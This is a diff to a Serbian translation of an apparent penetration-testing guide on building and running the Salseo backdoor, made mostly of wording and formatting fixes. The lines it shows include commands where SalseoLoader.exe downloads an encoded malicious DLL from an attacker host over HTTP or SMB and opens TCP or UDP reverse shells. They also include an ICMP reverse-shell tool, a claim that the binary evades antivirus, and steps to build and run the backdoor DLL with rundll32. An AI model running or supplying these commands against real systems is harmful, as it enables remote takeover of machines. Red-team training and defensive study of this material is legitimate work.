@@ -10,7 +10,7 @@ Kompajlirajte te projekte za arhitekturu Windows mašine na kojoj ćete ih koris
 
 Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" tabu** u **"Platform Target".**
 
-(\*\*Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)
+(**Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -34,25 +34,25 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 U redu, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **encoded EvilDalsa.dll** i **binary of SalseoLoader.**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+**Otpremite SalseoLoader.exe binarni fajl na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**
 
-## **Execute the backdoor**
+## **Izvršavanje backdoora**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
+### **Dobijanje TCP reverzibilne ljuske (preuzimanje kodiranog dll-a putem HTTP-a)**
 
-Zapamtite da pokrenete nc kao slušalac za reverznu ljusku i HTTP server da poslužite encoded evilsalsa.
+Zapamtite da pokrenete nc kao slušača reverzibilne ljuske i HTTP server da poslužite kodirani evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Dobijanje UDP reverzibilnog shell-a (preuzimanje kodirane dll preko SMB)**
+### **Dobijanje UDP reverzibilne ljuske (preuzimanje kodirane dll preko SMB)**
 
-Zapamtite da pokrenete nc kao slušača reverzibilnog shell-a, i SMB server da posluži kodirani evilsalsa (impacket-smbserver).
+Zapamtite da pokrenete nc kao slušač reverzibilne ljuske, i SMB server da posluži kodirani evilsalsa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Dobijanje ICMP reverz shell-a (kodirana dll već unutar žrtve)**
+### **Dobijanje ICMP reverzibilne ljuske (kodirana dll već unutar žrtve)**
 
-**Ovoga puta vam je potreban poseban alat na klijentu da primite reverz shell. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Ovoga puta vam je potreban poseban alat na klijentu da primite reverzibilnu ljusku. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Onemogućite ICMP odgovore:**
 ```
@@ -95,13 +95,13 @@ Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, to je neophodno)
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
-### **Izađite iz Visual Studio i izvršite DllExport_configure**
+### **Izađite iz Visual Studija i izvršite DllExport_configure**
 
-Jednostavno **izađite** iz Visual Studio
+Jednostavno **izađite** iz Visual Studija
 
 Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport_Configure.bat**
 
-Izaberite **x64** (ako ćete ga koristiti unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
+Izaberite **x64** (ako planirate da ga koristite unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
@@ -109,11 +109,29 @@ Izaberite **x64** (ako ćete ga koristiti unutar x64 okruženja, to je bio moj s
 
 **\[DllExport]** više ne bi trebao biti označen kao greška
 
-![](<../images/image (8) (1).png>
+![](<../images/image (8) (1).png>)
+
+### Izgradite rešenje
+
+Izaberite **Tip izlaza = Class Library** (Projekat --> SalseoLoader Svojstva --> Aplikacija --> Tip izlaza = Class Library)
+
+![](<../images/image (10) (1).png>)
+
+Izaberite **x64** **platformu** (Projekat --> SalseoLoader Svojstva --> Izgradnja --> Ciljna platforma = x64)
+
+![](<../images/image (9) (1) (1).png>)
+
+Da **izgradite** rešenje: Izgradnja --> Izgradi rešenje (Unutar izlazne konzole će se pojaviti putanja novog DLL-a)
+
+### Testirajte generisani Dll
+
+Kopirajte i nalepite Dll gde želite da ga testirate.
+
+Izvršite:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Ako se ne pojavi greška, verovatno imate funkcionalni DLL!!
+Ako se ne pojavi greška, verovatno imate funkcionalan DLL!!
 
 ## Dobijanje shel-a koristeći DLL
 
